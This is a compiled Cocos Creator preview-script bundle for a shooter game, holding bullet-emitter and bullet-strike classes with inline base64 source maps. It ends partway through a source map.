//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlclNoYW5EaWFuUWl1LnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxpREFBNEM7QUFFNUMsMENBQXVDO0FBRXZDLElBQU0sT0FBTyxHQUFHLENBQUMsQ0FBQztBQUVsQjtJQUFzRCw0Q0FBYTtJQUUvRCxrQ0FBWSxxQkFBMkM7UUFBdkQsWUFDSSxrQkFBTSxxQkFBcUIsQ0FBQyxTQUkvQjtRQUhHLEtBQUksQ0FBQyxZQUFZLEdBQUcsSUFBSSxDQUFDO1FBQ3pCLEtBQUksQ0FBQyxTQUFTLEdBQUcsSUFBSSxDQUFDO1FBQ3RCLEtBQUksQ0FBQyxNQUFNLEdBQUcsR0FBRyxDQUFDOztJQUN0QixDQUFDO0lBRUQsdUNBQUksR0FBSixVQUFLLEtBQWMsRUFBRSxHQUFZO1FBQzdCLElBQUksQ0FBQyxXQUFXLEVBQUUsQ0FBQztRQUNuQixJQUFJLE1BQU0sR0FBRyxJQUFJLENBQUMscUJBQXFCLENBQUMsaUJBQWlCLENBQUMsdUJBQWEsQ0FBQyxLQUFLLENBQUMsV0FBVyxDQUFDLENBQUM7UUFDM0YsTUFBTSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1FBQzFCLE1BQU0sQ0FBQyxJQUFJLENBQUMsUUFBUSxHQUFHLEtBQUssQ0FBQSw4REFBOEQsQ0FBQztRQUMzRixNQUFNLENBQUMsSUFBSSxDQUFDLEtBQUssR0FBRyxPQUFPLEdBQUcsYUFBSyxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUMsVUFBVSxDQUFDLE1BQU0sQ0FBQyxRQUFRLENBQUMsQ0FBQztRQUMxRSxNQUFNLENBQUMsR0FBRyxDQUFDLEdBQUcsRUFBRSxJQUFJLENBQUMsWUFBWSxFQUFFLElBQUksQ0FBQyxNQUFNLENBQUMsQ0FBQztJQUNwRCxDQUFDO0lBQ0wsK0JBQUM7QUFBRCxDQWpCQSxBQWlCQyxDQWpCcUQsdUJBQWEsR0FpQmxFIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBCdWxsZXRFbWl0dGVyIGZyb20gXCIuL0J1bGxldEVtaXR0ZXJcIjtcclxuaW1wb3J0IEdhbWVCdWxsZXRzQ29udHJvbGxlciBmcm9tIFwiLi4vLi4vZ2FtZS9HYW1lQnVsbGV0c0NvbnRyb2xsZXJcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uLy4uL2luZm8vV29ybGRcIjtcclxuXHJcbmNvbnN0IG1hZ25pZnkgPSAxO1xyXG5cclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQnVsbGV0RW1pdHRlclNoYW5EaWFuUWl1IGV4dGVuZHMgQnVsbGV0RW1pdHRlciB7XHJcblxyXG4gICAgY29uc3RydWN0b3IoZ2FtZUJ1bGxldHNDb250cm9sbGVyOkdhbWVCdWxsZXRzQ29udHJvbGxlcil7XHJcbiAgICAgICAgc3VwZXIoZ2FtZUJ1bGxldHNDb250cm9sbGVyKTtcclxuICAgICAgICB0aGlzLl9maXJpbmdSYW5nZSA9IDEwMDA7XHJcbiAgICAgICAgdGhpcy5faW50ZXJ2YWwgPSAwLjQ1O1xyXG4gICAgICAgIHRoaXMuX3NwZWVkID0gMzAwO1xyXG4gICAgfVxyXG5cclxuICAgIGZpcmUoc3RhcnQ6IGNjLlZlYzIsIGRpcjogY2MuVmVjMikge1xyXG4gICAgICAgIHRoaXMuYnVsbGV0Q291bnQtLTtcclxuICAgICAgICBsZXQgYnVsbGV0ID0gdGhpcy5nYW1lQnVsbGV0c0NvbnRyb2xsZXIuZ2V0SW5hY3RpdmVCdWxsZXQoQnVsbGV0RW1pdHRlci5UWVBFUy5TaGFuRGlhblFpdSk7XHJcbiAgICAgICAgYnVsbGV0Lm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICBidWxsZXQubm9kZS5wb3NpdGlvbiA9IHN0YXJ0LyouYWRkKGRpci5tdWwoKDxjYy5DaXJjbGVDb2xsaWRlcj5idWxsZXQuY29sbGlkZXIpLnJhZGl1cykpKi87XHJcbiAgICAgICAgYnVsbGV0Lm5vZGUuc2NhbGUgPSBtYWduaWZ5ICogV29ybGQuTXkuYXJtb3J5Lm1hZ25pZnlNdWwoYnVsbGV0LmJ1bGxldElkKTtcclxuICAgICAgICBidWxsZXQuZmx5KGRpciwgdGhpcy5fZmlyaW5nUmFuZ2UsIHRoaXMuX3NwZWVkKTtcclxuICAgIH1cclxufVxyXG5cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletStrike/BulletStrikeScale.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'a91eflkUmlHFK31B+j3oPQW', 'BulletStrikeScale');
// script/app/entities/bulletStrike/BulletStrikeScale.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletStrike_1 = require("./BulletStrike");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var BulletStrikeScale = /** @class */ (function (_super) {
    __extends(BulletStrikeScale, _super);
    function BulletStrikeScale() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    BulletStrikeScale.prototype.init = function (id) {
    };
    BulletStrikeScale.prototype.strike = function () {
        var _this = this;
        this.node.rotation = Math.random() * 360;
        this.node.scale = 0;
        this.node.runAction(cc.sequence(cc.scaleTo(0.2, 1), cc.callFunc(function () {
            _this.node.stopAllActions();
            _this.node.active = false;
        })));
    };
    BulletStrikeScale = __decorate([
        ccclass
    ], BulletStrikeScale);
    return BulletStrikeScale;
}(BulletStrike_1.default));
exports.default = BulletStrikeScale;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldFN0cmlrZS9CdWxsZXRTdHJpa2VTY2FsZS50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsK0NBQTBDO0FBRXBDLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQStDLHFDQUFZO0lBQTNEOztJQWVBLENBQUM7SUFkRyxnQ0FBSSxHQUFKLFVBQUssRUFBRTtJQUNQLENBQUM7SUFHRCxrQ0FBTSxHQUFOO1FBQUEsaUJBT0M7UUFORyxJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxJQUFJLENBQUMsTUFBTSxFQUFFLEdBQUMsR0FBRyxDQUFDO1FBQ3ZDLElBQUksQ0FBQyxJQUFJLENBQUMsS0FBSyxHQUFHLENBQUMsQ0FBQztRQUNwQixJQUFJLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxPQUFPLENBQUMsR0FBRyxFQUFFLENBQUMsQ0FBQyxFQUFFLEVBQUUsQ0FBQyxRQUFRLENBQUM7WUFDNUQsS0FBSSxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQztZQUMzQixLQUFJLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7UUFDN0IsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFBO0lBQ1IsQ0FBQztJQVpnQixpQkFBaUI7UUFEckMsT0FBTztPQUNhLGlCQUFpQixDQWVyQztJQUFELHdCQUFDO0NBZkQsQUFlQyxDQWY4QyxzQkFBWSxHQWUxRDtrQkFmb0IsaUJBQWlCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBCdWxsZXRTdHJpa2UgZnJvbSBcIi4vQnVsbGV0U3RyaWtlXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEJ1bGxldFN0cmlrZVNjYWxlIGV4dGVuZHMgQnVsbGV0U3RyaWtlIHtcclxuICAgIGluaXQoaWQpIHtcclxuICAgIH1cclxuXHJcblxyXG4gICAgc3RyaWtlKCkge1xyXG4gICAgICAgIHRoaXMubm9kZS5yb3RhdGlvbiA9IE1hdGgucmFuZG9tKCkqMzYwO1xyXG4gICAgICAgIHRoaXMubm9kZS5zY2FsZSA9IDA7XHJcbiAgICAgICAgdGhpcy5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5zY2FsZVRvKDAuMiwgMSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5zdG9wQWxsQWN0aW9ucygpO1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgfSkpKVxyXG4gICAgfVxyXG5cclxuXHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletEmitter/BulletEmitterHuoYan.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'b0708OLqc1I7JmsZsEiOmlz', 'BulletEmitterHuoYan');
// script/app/entities/bulletEmitter/BulletEmitterHuoYan.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletEmitter_1 = require("./BulletEmitter");
var BulletEmitterHuoYan = /** @class */ (function (_super) {
    __extends(BulletEmitterHuoYan, _super);
    function BulletEmitterHuoYan(gameBulletsController) {
        var _this = _super.call(this, gameBulletsController) || this;
        _this._list = [];
        _this._firingRange = 600;
        _this._interval = 0.15;
        _this._speed = 300;
        return _this;
    }
    BulletEmitterHuoYan.prototype.fire = function (start, dir) {
        this.bulletCount--;
        var bullet = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.HuoYan);
        bullet.node.active = true;
        bullet.node.position = start;
        bullet.fly(dir, this._firingRange, this._speed);
        this._list.unshift(bullet);
        this._list = this._list.filter(function (value) { return value.node.active == true; });
        // let p = start;
        // for (let i=0; i<3; i++){
        //     let bullet = this.gameBulletsController.getInactiveBullet(BulletEmitter.TYPES.HuoYan);
        //     bullet.node.active = true;
        //     bullet.node.position = p.add(dir.mul((3-i)*30));
        //     bullet.fly(dir, this._firingRange, this._speed);
        //     this._list.unshift(bullet);
        // }
        this._list.forEach(function (value, index) { return value.node.zIndex = index; });
    };
    return BulletEmitterHuoYan;
}(BulletEmitter_1.default));
exports.default = BulletEmitterHuoYan;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckh1b1lhbi50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBRUEsaURBQTRDO0FBRTVDO0lBQWlELHVDQUFhO0lBSTFELDZCQUFZLHFCQUEyQztRQUF2RCxZQUNJLGtCQUFNLHFCQUFxQixDQUFDLFNBSS9CO1FBUE8sV0FBSyxHQUFTLEVBQUUsQ0FBQztRQUlyQixLQUFJLENBQUMsWUFBWSxHQUFHLEdBQUcsQ0FBQztRQUN4QixLQUFJLENBQUMsU0FBUyxHQUFHLElBQUksQ0FBQztRQUN0QixLQUFJLENBQUMsTUFBTSxHQUFHLEdBQUcsQ0FBQzs7SUFDdEIsQ0FBQztJQUVELGtDQUFJLEdBQUosVUFBSyxLQUFjLEVBQUUsR0FBWTtRQUM3QixJQUFJLENBQUMsV0FBVyxFQUFFLENBQUM7UUFDbkIsSUFBSSxNQUFNLEdBQUcsSUFBSSxDQUFDLHFCQUFxQixDQUFDLGlCQUFpQixDQUFDLHVCQUFhLENBQUMsS0FBSyxDQUFDLE1BQU0sQ0FBQyxDQUFDO1FBQ3RGLE1BQU0sQ0FBQyxJQUFJLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztRQUMxQixNQUFNLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxLQUFLLENBQUM7UUFDN0IsTUFBTSxDQUFDLEdBQUcsQ0FBQyxHQUFHLEVBQUUsSUFBSSxDQUFDLFlBQVksRUFBRSxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDaEQsSUFBSSxDQUFDLEtBQUssQ0FBQyxPQUFPLENBQUMsTUFBTSxDQUFDLENBQUM7UUFDM0IsSUFBSSxDQUFDLEtBQUssR0FBRyxJQUFJLENBQUMsS0FBSyxDQUFDLE1BQU0sQ0FBQyxVQUFBLEtBQUssSUFBSSxPQUFBLEtBQUssQ0FBQyxJQUFJLENBQUMsTUFBTSxJQUFJLElBQUksRUFBekIsQ0FBeUIsQ0FBQyxDQUFDO1FBQ25FLGlCQUFpQjtRQUNqQiwyQkFBMkI7UUFDM0IsNkZBQTZGO1FBQzdGLGlDQUFpQztRQUNqQyx1REFBdUQ7UUFDdkQsdURBQXVEO1FBQ3ZELGtDQUFrQztRQUNsQyxJQUFJO1FBQ0osSUFBSSxDQUFDLEtBQUssQ0FBQyxPQUFPLENBQUMsVUFBQyxLQUFLLEVBQUUsS0FBSyxJQUFLLE9BQUEsS0FBSyxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxFQUF6QixDQUF5QixDQUFDLENBQUM7SUFDcEUsQ0FBQztJQUNMLDBCQUFDO0FBQUQsQ0E3QkEsQUE2QkMsQ0E3QmdELHVCQUFhLEdBNkI3RCIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgR2FtZUJ1bGxldHNDb250cm9sbGVyIGZyb20gXCIuLi8uLi9nYW1lL0dhbWVCdWxsZXRzQ29udHJvbGxlclwiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlciBmcm9tIFwiLi9CdWxsZXRFbWl0dGVyXCI7XHJcblxyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBCdWxsZXRFbWl0dGVySHVvWWFuIGV4dGVuZHMgQnVsbGV0RW1pdHRlciB7XHJcblxyXG4gICAgcHJpdmF0ZSBfbGlzdDpBcnJheSA9IFtdO1xyXG5cclxuICAgIGNvbnN0cnVjdG9yKGdhbWVCdWxsZXRzQ29udHJvbGxlcjpHYW1lQnVsbGV0c0NvbnRyb2xsZXIpe1xyXG4gICAgICAgIHN1cGVyKGdhbWVCdWxsZXRzQ29udHJvbGxlcik7XHJcbiAgICAgICAgdGhpcy5fZmlyaW5nUmFuZ2UgPSA2MDA7XHJcbiAgICAgICAgdGhpcy5faW50ZXJ2YWwgPSAwLjE1O1xyXG4gICAgICAgIHRoaXMuX3NwZWVkID0gMzAwO1xyXG4gICAgfVxyXG5cclxuICAgIGZpcmUoc3RhcnQ6IGNjLlZlYzIsIGRpcjogY2MuVmVjMikge1xyXG4gICAgICAgIHRoaXMuYnVsbGV0Q291bnQtLTtcclxuICAgICAgICBsZXQgYnVsbGV0ID0gdGhpcy5nYW1lQnVsbGV0c0NvbnRyb2xsZXIuZ2V0SW5hY3RpdmVCdWxsZXQoQnVsbGV0RW1pdHRlci5UWVBFUy5IdW9ZYW4pO1xyXG4gICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgYnVsbGV0Lm5vZGUucG9zaXRpb24gPSBzdGFydDtcclxuICAgICAgICBidWxsZXQuZmx5KGRpciwgdGhpcy5fZmlyaW5nUmFuZ2UsIHRoaXMuX3NwZWVkKTtcclxuICAgICAgICB0aGlzLl9saXN0LnVuc2hpZnQoYnVsbGV0KTtcclxuICAgICAgICB0aGlzLl9saXN0ID0gdGhpcy5fbGlzdC5maWx0ZXIodmFsdWUgPT4gdmFsdWUubm9kZS5hY3RpdmUgPT0gdHJ1ZSk7XHJcbiAgICAgICAgLy8gbGV0IHAgPSBzdGFydDtcclxuICAgICAgICAvLyBmb3IgKGxldCBpPTA7IGk8MzsgaSsrKXtcclxuICAgICAgICAvLyAgICAgbGV0IGJ1bGxldCA9IHRoaXMuZ2FtZUJ1bGxldHNDb250cm9sbGVyLmdldEluYWN0aXZlQnVsbGV0KEJ1bGxldEVtaXR0ZXIuVFlQRVMuSHVvWWFuKTtcclxuICAgICAgICAvLyAgICAgYnVsbGV0Lm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAvLyAgICAgYnVsbGV0Lm5vZGUucG9zaXRpb24gPSBwLmFkZChkaXIubXVsKCgzLWkpKjMwKSk7XHJcbiAgICAgICAgLy8gICAgIGJ1bGxldC5mbHkoZGlyLCB0aGlzLl9maXJpbmdSYW5nZSwgdGhpcy5fc3BlZWQpO1xyXG4gICAgICAgIC8vICAgICB0aGlzLl9saXN0LnVuc2hpZnQoYnVsbGV0KTtcclxuICAgICAgICAvLyB9XHJcbiAgICAgICAgdGhpcy5fbGlzdC5mb3JFYWNoKCh2YWx1ZSwgaW5kZXgpID0+IHZhbHVlLm5vZGUuekluZGV4ID0gaW5kZXgpO1xyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletEmitter/BulletEmitter.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '20d59hobkVP7p8yXkmyYW5w', 'BulletEmitter');
// script/app/entities/bulletEmitter/BulletEmitter.ts

Object.defineProperty(exports, "__esModule", { value: true });
var ExcelTableNames_1 = require("../../config/ExcelTableNames");
var ExcelConfig_1 = require("../../../../framework/config/ExcelConfig");
var GameProxy_1 = require("../../game/GameProxy");
var World_1 = require("../../info/World");
/**
 * 子弹发射器只负责发射子弹
 * 控制一次发射的子弹个数及每一颗子弹的发射
 */
var BulletEmitter = /** @class */ (function () {
    function BulletEmitter(gameBulletsController) {
        this._gameBulletsController = null;
        /** 射程 */
        this._firingRange = 0;
        /** 发射间隔 */
        this._interval = 0;
        /** 子弹的速度 */
        this._speed = 0;
        /** 弹容量 */
        this._payload = 0;
        /** 剩余弹量 */
        this._bulletCount = 0;
        this._bulletEmitterID = 0;
        this._gameBulletsController = gameBulletsController;
    }
    Object.defineProperty(BulletEmitter.prototype, "firingRange", {
        get: function () {
            return this._firingRange;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(BulletEmitter.prototype, "interval", {
        get: function () {
            return this._interval;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(BulletEmitter.prototype, "speed", {
        get: function () {
            return this._speed;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(BulletEmitter.prototype, "payload", {
        get: function () {
            return this._payload;
        },
        set: function (value) {
            this._payload = value;
            this.bulletCount = this._payload;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(BulletEmitter.prototype, "bulletCount", {
        get: function () {
            return this._bulletCount;
        },
        set: function (value) {
            this._bulletCount = value;
            GameProxy_1.GameProxy.emit(GameProxy_1.GameProxy.Event.UpdateBulletCount);
        },
        enumerable: false,
        configurable: true
    });
    /** 是否子弹用尽 */
    BulletEmitter.prototype.isUseUp = function () {
        return this._payload != 0 && this._bulletCount < 1;
    };
    Object.defineProperty(BulletEmitter.prototype, "gameBulletsController", {
        get: function () {
            return this._gameBulletsController;
        },
        enumerable: false,
        configurable: true
    });
    BulletEmitter.prototype.init = function (id) {
        this._bulletEmitterID = id;
        var config = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.Weapon)[this._bulletEmitterID - 1];
        this._speed = config['speed'];
        this._firingRange = config['range'] * World_1.World.My.armory.rangeMulOf(this._bulletEmitterID);
        this._interval = config['fre'] * World_1.World.My.armory.freMulOf(this._bulletEmitterID);
        this.payload = World_1.World.My.armory.payloadAddOf(this._bulletEmitterID);
        console.log('payload===>', this._payload);
    };
    BulletEmitter.prototype.onEnter = function () { };
    BulletEmitter.prototype.onExit = function () { };
    BulletEmitter.TYPES = {
        ShouQiang: 1,
        PenZi: 2,
        JiaTeLin: 3,
        SanDanQiang: 4,
        HuoYan: 5,
        JiGuang: 6,
        JuJiQiang: 7,
        LiZiPao: 8,
        HuoJianTong: 9,
        ShanDianQiu: 10,
    };
    return BulletEmitter;
}());
exports.default = BulletEmitter;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlci50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsZ0VBQTZEO0FBQzdELHdFQUFxRTtBQUNyRSxrREFBK0M7QUFDL0MsMENBQXVDO0FBRXZDOzs7R0FHRztBQUdIO0lBZUksdUJBQXNCLHFCQUEyQztRQUd6RCwyQkFBc0IsR0FBeUIsSUFBSSxDQUFDO1FBRzVELFNBQVM7UUFDQyxpQkFBWSxHQUFHLENBQUMsQ0FBQztRQU0zQixXQUFXO1FBQ0QsY0FBUyxHQUFHLENBQUMsQ0FBQztRQU94QixZQUFZO1FBQ0YsV0FBTSxHQUFHLENBQUMsQ0FBQztRQU9yQixVQUFVO1FBQ0YsYUFBUSxHQUFHLENBQUMsQ0FBQztRQVdyQixXQUFXO1FBQ0gsaUJBQVksR0FBRyxDQUFDLENBQUM7UUF1QmYscUJBQWdCLEdBQUcsQ0FBQyxDQUFDO1FBaEUzQixJQUFJLENBQUMsc0JBQXNCLEdBQUcscUJBQXFCLENBQUM7SUFDeEQsQ0FBQztJQU9ELHNCQUFJLHNDQUFXO2FBQWY7WUFDSSxPQUFPLElBQUksQ0FBQyxZQUFZLENBQUM7UUFDN0IsQ0FBQzs7O09BQUE7SUFNRCxzQkFBSSxtQ0FBUTthQUFaO1lBQ0ksT0FBTyxJQUFJLENBQUMsU0FBUyxDQUFDO1FBQzFCLENBQUM7OztPQUFBO0lBTUQsc0JBQUksZ0NBQUs7YUFBVDtZQUNJLE9BQU8sSUFBSSxDQUFDLE1BQU0sQ0FBQztRQUN2QixDQUFDOzs7T0FBQTtJQUtELHNCQUFJLGtDQUFPO2FBQVg7WUFDSSxPQUFPLElBQUksQ0FBQyxRQUFRLENBQUM7UUFDekIsQ0FBQzthQUVELFVBQVksS0FBYTtZQUNyQixJQUFJLENBQUMsUUFBUSxHQUFHLEtBQUssQ0FBQztZQUN0QixJQUFJLENBQUMsV0FBVyxHQUFHLElBQUksQ0FBQyxRQUFRLENBQUM7UUFDckMsQ0FBQzs7O09BTEE7SUFXRCxzQkFBSSxzQ0FBVzthQUFmO1lBQ0ksT0FBTyxJQUFJLENBQUMsWUFBWSxDQUFDO1FBQzdCLENBQUM7YUFHRCxVQUFnQixLQUFhO1lBQ3pCLElBQUksQ0FBQyxZQUFZLEdBQUcsS0FBSyxDQUFDO1lBQzFCLHFCQUFTLENBQUMsSUFBSSxDQUFDLHFCQUFTLENBQUMsS0FBSyxDQUFDLGlCQUFpQixDQUFDLENBQUM7UUFDdEQsQ0FBQzs7O09BTkE7SUFRRCxhQUFhO0lBQ2IsK0JBQU8sR0FBUDtRQUNJLE9BQU8sSUFBSSxDQUFDLFFBQVEsSUFBSSxDQUFDLElBQUksSUFBSSxDQUFDLFlBQVksR0FBRyxDQUFDLENBQUM7SUFDdkQsQ0FBQztJQUVELHNCQUFJLGdEQUFxQjthQUF6QjtZQUNJLE9BQU8sSUFBSSxDQUFDLHNCQUFzQixDQUFDO1FBQ3ZDLENBQUM7OztPQUFBO0lBS0QsNEJBQUksR0FBSixVQUFLLEVBQVM7UUFDVixJQUFJLENBQUMsZ0JBQWdCLEdBQUcsRUFBRSxDQUFDO1FBQzNCLElBQUksTUFBTSxHQUFHLHlCQUFXLENBQUMsYUFBYSxDQUFDLGlDQUFlLENBQUMsTUFBTSxDQUFDLENBQUMsSUFBSSxDQUFDLGdCQUFnQixHQUFDLENBQUMsQ0FBQyxDQUFDO1FBQ3hGLElBQUksQ0FBQyxNQUFNLEdBQUcsTUFBTSxDQUFDLE9BQU8sQ0FBQyxDQUFDO1FBQzlCLElBQUksQ0FBQyxZQUFZLEdBQUcsTUFBTSxDQUFDLE9BQU8sQ0FBQyxHQUFDLGFBQUssQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLFVBQVUsQ0FBQyxJQUFJLENBQUMsZ0JBQWdCLENBQUMsQ0FBQztRQUN0RixJQUFJLENBQUMsU0FBUyxHQUFHLE1BQU0sQ0FBQyxLQUFLLENBQUMsR0FBQyxhQUFLLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLGdCQUFnQixDQUFDLENBQUM7UUFDL0UsSUFBSSxDQUFDLE9BQU8sR0FBRyxhQUFLLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQyxZQUFZLENBQUMsSUFBSSxDQUFDLGdCQUFnQixDQUFDLENBQUM7UUFDbkUsT0FBTyxDQUFDLEdBQUcsQ0FBQyxhQUFhLEVBQUUsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDO0lBQzlDLENBQUM7SUFJRCwrQkFBTyxHQUFQLGNBQVUsQ0FBQztJQUNYLDhCQUFNLEdBQU4sY0FBUyxDQUFDO0lBN0ZILG1CQUFLLEdBQUc7UUFDWCxTQUFTLEVBQUcsQ0FBQztRQUNiLEtBQUssRUFBRyxDQUFDO1FBQ1QsUUFBUSxFQUFHLENBQUM7UUFDWixXQUFXLEVBQUcsQ0FBQztRQUNmLE1BQU0sRUFBRyxDQUFDO1FBQ1YsT0FBTyxFQUFHLENBQUM7UUFDWCxTQUFTLEVBQUcsQ0FBQztRQUNiLE9BQU8sRUFBRyxDQUFDO1FBQ1gsV0FBVyxFQUFHLENBQUM7UUFDZixXQUFXLEVBQUcsRUFBRTtLQUNuQixDQUFDO0lBbUZOLG9CQUFDO0NBaEdELEFBZ0dDLElBQUE7a0JBaEc2QixhQUFhIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiaW1wb3J0IEdhbWVCdWxsZXRzQ29udHJvbGxlciBmcm9tIFwiLi4vLi4vZ2FtZS9HYW1lQnVsbGV0c0NvbnRyb2xsZXJcIjtcclxuaW1wb3J0IHtFeGNlbFRhYmxlTmFtZXN9IGZyb20gXCIuLi8uLi9jb25maWcvRXhjZWxUYWJsZU5hbWVzXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7R2FtZVByb3h5fSBmcm9tIFwiLi4vLi4vZ2FtZS9HYW1lUHJveHlcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uLy4uL2luZm8vV29ybGRcIjtcclxuXHJcbi8qKlxyXG4gKiDlrZDlvLnlj5HlsITlmajlj6rotJ/otKPlj5HlsITlrZDlvLlcclxuICog5o6n5Yi25LiA5qyh5Y+R5bCE55qE5a2Q5by55Liq5pWw5Y+K5q+P5LiA6aKX5a2Q5by555qE5Y+R5bCEXHJcbiAqL1xyXG5cclxuXHJcbmV4cG9ydCBkZWZhdWx0IGFic3RyYWN0IGNsYXNzIEJ1